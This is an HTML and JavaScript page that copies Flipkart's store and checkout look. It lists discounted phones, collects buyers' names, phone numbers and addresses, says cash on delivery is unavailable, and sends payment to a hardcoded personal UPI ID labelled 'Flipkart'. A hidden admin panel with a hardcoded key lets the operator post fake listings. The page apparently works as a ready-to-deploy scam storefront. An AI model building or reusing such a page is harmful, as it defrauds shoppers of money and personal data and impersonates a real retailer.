<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flipkart - Order Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; }
        .fk-blue { background-color: #2874f0; }
        .step-header { background: #fff; padding: 15px; border-bottom: 1px solid #ddd; margin-bottom: 2px; display: flex; align-items: center; }
        .step-num { background: #f1f3f6; color: #2874f0; width: 20px; height: 20px; border-radius: 2px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; margin-right: 12px; }
        .product-card { background: white; border-right: 1px solid #eee; border-bottom: 1px solid #eee; position: relative; }
        .gear-btn { position: absolute; top: 8px; right: 8px; color: #ddd; z-index: 10; font-size: 16px; cursor: pointer; }
        .line-clamp { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
        input, textarea { border: 1px solid #ddd; padding: 12px; width: 100%; border-radius: 4px; margin-bottom: 12px; outline: none; font-size: 14px; }
        .btn-orange { background: #fb641b; color: white; font-weight: bold; padding: 15px; width: 100%; border-radius: 2px; box-shadow: 0 1px 2px rgba(0,0,0,.2); }
        .disabled-option { opacity: 0.6; background: #f9f9f9; pointer-events: none; }
    </style>
</head>
<body class="pb-20">

    <header id="mainHeader" class="fk-blue p-3 sticky top-0 z-[100] text-white flex justify-between items-center">
        <div class="flex items-center space-x-3">
            <i class="fa-solid fa-bars"></i>
            <span class="font-bold italic text-xl">Flipkart</span>
        </div>
        <button onclick="openAdd()" class="bg-white text-[#2874f0] px-3 py-1 rounded-sm font-bold text-[10px] uppercase">Add Product</button>
    </header>

    <div id="storeView" class="grid grid-cols-2 bg-white"></div>

    <div id="checkoutPage" class="hidden fixed inset-0 bg-[#f1f3f6] z-[300] overflow-y-auto">
        <nav class="fk-blue p-3 text-white flex items-center shadow-md">
            <i class="fa-solid fa-arrow-left text-xl mr-5" onclick="closeCheckout()"></i>
            <span class="font-medium">Payments</span>
        </nav>

        <div class="step-header">
            <span class="step-num">1</span>
            <span class="text-sm font-bold text-gray-500 uppercase">Login / Contact</span>
        </div>
        <div class="bg-white p-4 mb-2">
            <input type="text" id="custName" placeholder="Full Name">
            <input type="number" id="custPhone" placeholder="Mobile Number">
        </div>

        <div class="step-header">
            <span class="step-num">2</span>
            <span class="text-sm font-bold text-gray-500 uppercase">Delivery Address</span>
        </div>
        <div class="bg-white p-4 mb-2">
            <input type="number" placeholder="Pincode (Required)">
            <textarea id="custAddr" placeholder="Full Address (House No, Area, Road)" rows="2"></textarea>
        </div>

        <div class="step-header">
            <span class="step-num">3</span>
            <span class="text-sm font-bold text-gray-500 uppercase">Payment Method</span>
        </div>
        <div class="bg-white p-4">
            <div class="space-y-3">
                <label class="flex items-center justify-between p-4 border-2 border-blue-500 rounded bg-blue-50">
                    <div class="flex items-center">
                        <input type="radio" name="pay" class="w-4 h-4 mr-3" checked>
                        <div>
                            <p class="text-sm font-bold">UPI</p>
                            <p class="text-[10px] text-gray-500">Google Pay, PhonePe, Paytm</p>
                        </div>
                    </div>
                    <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/upi_8992ba.png" class="h-4">
                </label>

                <div class="flex items-center justify-between p-4 border rounded disabled-option">
                    <div class="flex items-center">
                        <input type="radio" disabled class="w-4 h-4 mr-3">
                        <div>
                            <p class="text-sm font-bold text-gray-400">Cash on Delivery</p>
                            <p class="text-[10px] text-red-500 font-bold">Currently not available for this item</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="bg-white p-4 mt-2 mb-20">
            <p class="font-bold text-gray-400 text-[10px] uppercase mb-3 tracking-widest">Price Details</p>
            <div class="flex justify-between text-sm mb-2"><span>Price (1 item)</span> <span id="summaryPrice">₹0</span></div>
            <div class="flex justify-between text-sm mb-2"><span>Delivery Charges</span> <span class="text-green-600">FREE</span></div>
            <div class="flex justify-between text-lg font-bold border-t pt-3 mt-2"><span>Total Amount</span> <span id="summaryTotal" class="text-black">₹0</span></div>
            <p class="text-green-600 text-[11px] font-bold mt-2">You will save ₹2,000 on this order</p>
        </div>

        <div class="p-3 bg-white sticky bottom-0 border-t shadow-[0_-5px_15px_rgba(0,0,0,0.05)] flex items-center justify-between">
            <div>
                <p class="text-xs text-gray-500 line-through" id="oldPriceSummary">₹0</p>
                <p class="font-bold text-lg" id="finalPriceSummary">₹0</p>
            </div>
            <button onclick="placeOrder()" class="btn-orange px-10 py-3 w-auto">CONTINUE</button>
        </div>
    </div>

    <div id="adminPanel" class="hidden fixed inset-0 bg-white z-[500] p-5 overflow-y-auto">
        <h2 class="text-xl font-bold border-b pb-3 mb-4">Admin Panel</h2>
        <input type="password" id="adminKey" placeholder="Secret Lock (947228)">
        <input type="text" id="pName" placeholder="Product Title">
        <input type="number" id="pPrice" placeholder="Selling Price">
        <input type="number" id="pMRP" placeholder="MRP Price">
        <input type="text" id="pImg" placeholder="Image URL">
        <textarea id="pDesc" placeholder="Description..." rows="3"></textarea>
        <button onclick="saveItem()" class="w-full fk-blue text-white py-4 rounded font-bold uppercase">Update Store</button>
        <button onclick="closeAdmin()" class="w-full mt-2 text-gray-400 text-xs">CLOSE</button>
    </div>

    <div id="detailView" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto pb-20">
        <nav class="p-3 border-b flex items-center sticky top-0 bg-white z-50">
            <i class="fa-solid fa-arrow-left text-xl mr-5" onclick="location.reload()"></i>
            <span class="font-medium">Product Details</span>
        </nav>
        <div id="detailContent" class="p-5"></div>
        <div class="fixed bottom-0 w-full h-14 flex bg-white border-t z-50">
            <button class="flex-1 font-bold text-gray-700 uppercase text-xs border-r">Add to Cart</button>
            <button onclick="openCheckout()" class="flex-1 fk-blue text-white font-bold uppercase text-xs">Buy Now</button>
        </div>
    </div>

    <script>
        const SECRET = "947228";
        const UPI_ID = "8709615634-w350@ybl";
        let products = JSON.parse(localStorage.getItem('fk_v20_final')) || [];
        let activeP = null;

        const defaultProducts = [
            { name: "iPhone 16 Pro Max (Desert Titanium)", price: 144900, mrp: 159900, img: "https://m.media-amazon.com/images/I/81Sig6biNPL._SL1500_.jpg", desc: "A18 Pro chip, 48MP camera." },
            { name: "Samsung Galaxy S24 Ultra 5G", price: 129999, mrp: 154999, img: "https://m.media-amazon.com/images/I/71RVuS3q9QL._SL1500_.jpg", desc: "Built-in S Pen, 200MP Camera." }
        ];

        function init() {
            if(products.length === 0) products = defaultProducts;
            render();
        }

        function render() {
            document.getElementById('storeView').innerHTML = products.map((p, i) => `
                <div class="product-card p-4">
                    <i class="fa-solid fa-plus-circle gear-btn" onclick="openEdit(${i})"></i>
                    <div onclick="showDetail(${i})">
                        <div class="h-32 flex items-center justify-center mb-3">
                            <img src="${p.img}" class="max-h-full object-contain">
                        </div>
                        <h3 class="text-xs text-gray-700 line-clamp h-8 font-normal">${p.name}</h3>
                        <div class="flex items-center space-x-2 mt-2">
                            <span class="font-bold text-sm">₹${Number(p.price).toLocaleString('en-IN')}</span>
                            <span class="text-[10px] text-green-600 font-bold">${Math.round(100-(p.price/p.mrp*100))}% OFF</span>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        function showDetail(i) {
            activeP = products[i];
            document.getElementById('detailContent').innerHTML = `
                <img src="${activeP.img}" class="w-full h-64 object-contain mb-5">
                <h1 class="text-lg text-gray-800 font-normal mb-2">${activeP.name}</h1>
                <div class="flex items-center space-x-2 mb-4">
                    <span class="text-2xl font-bold">₹${Number(activeP.price).toLocaleString('en-IN')}</span>
                    <span class="text-gray-400 line-through">₹${Number(activeP.mrp).toLocaleString('en-IN')}</span>
                </div>
                <p class="text-sm text-gray-600 border-t pt-4">${activeP.desc}</p>
            `;
            document.getElementById('detailView').classList.remove('hidden');
        }

        function openCheckout() {
            const formattedPrice = "₹" + Number(activeP.price).toLocaleString('en-IN');
            document.getElementById('summaryPrice').innerText = formattedPrice;
            document.getElementById('summaryTotal').innerText = formattedPrice;
            document.getElementById('finalPriceSummary').innerText = formattedPrice;
            document.getElementById('oldPriceSummary').innerText = "₹" + Number(activeP.mrp).toLocaleString('en-IN');
            document.getElementById('checkoutPage').classList.remove('hidden');
        }

        function placeOrder() {
            const name = document.getElementById('custName').value;
            const phone = document.getElementById('custPhone').value;
            const addr = document.getElementById('custAddr').value;
            if(!name || !phone || !addr) return alert("Please complete Step 1 & 2 first!");
            window.location.href = `upi://pay?pa=${UPI_ID}&pn=Flipkart&am=${activeP.price}&cu=INR`;
        }

        function closeCheckout() { document.getElementById('checkoutPage').classList.add('hidden'); }
        function openAdd() { document.getElementById('adminPanel').classList.remove('hidden'); }
        function closeAdmin() { document.getElementById('adminPanel').classList.add('hidden'); }
        function saveItem() {
            if(document.getElementById('adminKey').value !== SECRET) return alert("Unauthorized!");
            const data = {
                name: document.getElementById('pName').value,
                price: document.getElementById('pPrice').value,
                mrp: document.getElementById('pMRP').value,
                img: document.getElementById('pImg').value,
                desc: document.getElementById('pDesc').value
            };
            products.unshift(data);
            localStorage.setItem('fk_v20_final', JSON.stringify(products));
            location.reload();
        }

        init();
    </script>
</body>
</html>
